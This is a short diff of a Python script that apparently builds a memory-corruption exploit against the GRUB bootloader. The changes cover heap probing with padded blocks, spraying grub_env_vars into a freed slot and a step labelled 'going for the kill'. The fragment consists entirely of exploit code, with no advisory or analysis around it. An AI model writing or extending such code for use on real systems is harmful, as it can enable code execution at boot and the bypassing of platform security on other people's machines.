@@ -7,8 +7,8 @@ from util import command, find_root, grub_print, force_regions_to_exist, \
         grub_mm_header_t, hashval, Variable
 
 
-def probe_body(body):
-    pre = b'b'*(48)
+def probe_body(body, offset=48):
+    pre = b'b'*offset
     post = b'c'*64
     spare = BLOCK_SIZE - (len(pre) + len(post))
     rest = body * (spare // len(body))
@@ -171,11 +171,11 @@ def clashgpt(basepath):
     internal += ['break']
 
     trigger += while_loop('1 = 1', internal)
-    trigger += command('echo [!] Found: ${depth_} ${fun} ${curr}')
 
     # from this point on we need to be very careful about variable names, as
     # introducing a fake grub_env_var will make some inaccessible.
     internal = []
+    internal += command('echo [!] Found: ${depth_} ${fun} ${curr}')
     internal += grub_print('[!] going for the kill')
     internal += command('unset ${end}')
     # spray grub_env_vars to get one in our free slot
